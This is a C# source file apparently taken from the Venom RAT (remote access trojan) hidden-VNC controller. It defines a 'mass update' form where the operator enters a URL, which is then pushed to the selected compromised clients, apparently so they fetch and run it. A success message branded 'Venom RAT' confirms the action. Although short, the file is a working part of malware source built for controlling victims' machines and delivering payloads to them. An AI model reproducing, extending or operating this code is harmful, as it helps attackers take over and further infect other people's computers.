using System;
using System.Windows.Forms;

namespace VenomRAT_HVNC.HVNC
{
    public partial class FrmMassUpdate : Form
    {
        public FrmMassUpdate()
        {
            this.InitializeComponent();
        }

        private void StartHiddenURLbtn_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(this.Urlbox.Text))
                {
                    MessageBox.Show("URL is not valid!");
                }
                else
                {
                    FrmMain.MassURL = this.Urlbox.Text;
                    FrmMain.ispressed = true;
                    MessageBox.Show("Executed Successfully!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    base.Close();
                }
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Update Selected Client(s)");
                base.Close();
            }
        }

        public int count;
    }
}
